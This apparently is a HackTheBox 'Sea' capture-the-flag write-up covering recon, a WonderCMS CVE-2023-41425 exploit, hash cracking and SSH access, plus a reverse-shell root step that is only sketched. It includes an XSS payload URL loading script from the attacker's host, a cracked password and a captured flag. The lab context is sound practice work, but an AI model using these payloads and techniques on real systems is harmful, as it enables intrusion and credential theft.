---
title: "HackTheBox - Easy - Sea"
date: 2025-11-03 12:00:00 -0700
categories: [CTF,HackTheBox]
tags: [linux]
---

![Sea](/assets/img/ctf/htb/easy/sea/Sea.png))

# Initial Intel
* Difficulty: Easy
* OS: Linux

# tl;dr
<details><summary>Spoilers</summary>
</details>

# Attack Path

## Recon

### Service Enumeration

Let's start off with a basic TCP scan. If we can't find anything we can later run a UDP scan.

```bash
# set host & initiate a standard tcp scan
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $sea
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))                                              _http-title: Sea - Home                                     
```

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ feroxbuster --url http://$sea --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do


```

![Website landing page](/assets/img/ctf/htb/easy/sea/1.png)

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ sudo vim /etc/hosts
[sudo] password for haunter:
```

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ feroxbuster --url http://sea.htb/themes/bike/ --depth 3 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
```

```bash
http://sea.htb/themes/bike/README.md
http://sea.htb/themes/bike/version
```

*WonderCMS 3.2.0*

https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE


```bash
python3 CVE-2023-41425.py -rhost http://sea.htb/loginURL -lhost 10.10.14.17 -lport 4444 -sport 8000


http://sea.htb/loginURL/index.php?page=loginURL?"></form><script+src="http://10.10.14.17:8000/xss.js"></script><form+action="
```


## Foothold

## Lateral Movement / Privilege Escalation

```bash
www-data@sea:/var/www$ ls /home
amay
geo
```

```bash
www-data@sea:/var/www$ ls sea/data                                                                                                                                                                                        
ls sea/data                                                                                                                                                                                                               
cache.json  database.js  files                                                                                                                                                                                            
www-data@sea:/var/www$ cat sea/data/database.js                                                                                                                                                                           
cat sea/data/database.js                                                                                                                                                                                                  
{                                                                                                                                                                                                                         
    "config": {                                                                                                                                                                                                           
        "siteTitle": "Sea",                                                                                                                                                                                               
        "theme": "bike",                                                                                                                                                                                                  
        "defaultPage": "home",                                                                                                                                                                                            
        "login": "loginURL",                                                                                                                                                                                              
        "forceLogout": false,                                                                                                                                                                                             
        "forceHttps": false,                                                                                 
        "saveChangesPopup": false,                                                                           
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",   
```

```bash
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```
/etc/apache2/sites-enabled/sea.conf


```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ printf '%s\n' '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt
 
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

...
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance 
```

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea/CVE-2023-41425-wonderCMS_RCE]
└─$ ssh amay@$sea 
amay@10.10.11.28's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)  

amay@sea:~$ ls -alh
total 32K
drwxr-xr-x 4 amay amay 4.0K Aug  1  2024 .
drwxr-xr-x 4 root root 4.0K Jul 30  2024 ..
lrwxrwxrwx 1 root root    9 Aug  1  2024 .bash_history -> /dev/null
-rw-r--r-- 1 amay amay  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 amay amay 3.7K Feb 25  2020 .bashrc
drwx------ 2 amay amay 4.0K Aug  1  2024 .cache
-rw-r--r-- 1 amay amay  807 Feb 25  2020 .profile
drwx------ 2 amay amay 4.0K Feb 21  2024 .ssh
-rw-r----- 1 root amay   33 Nov  4 23:12 user.txt
amay@sea:~$ cat user.txt 
76883a41becaf8353c8a0e9942403a3c
amay@sea:~$ 
```

## Root / SYSTEM

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]                                                                  
└─$ ssh amay@$sea -p 22 -L 9999:127.0.0.1:8080                                                               
amay@10.10.11.28's password:                                                                                 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)   


```

Edit /etc/hosts
127.0.0.1   attacker

Navigate to http://attacker:9999 in browser

Capture POST, edit variable and add bash command with URL encoding to get revshell.


# Lessons Learned

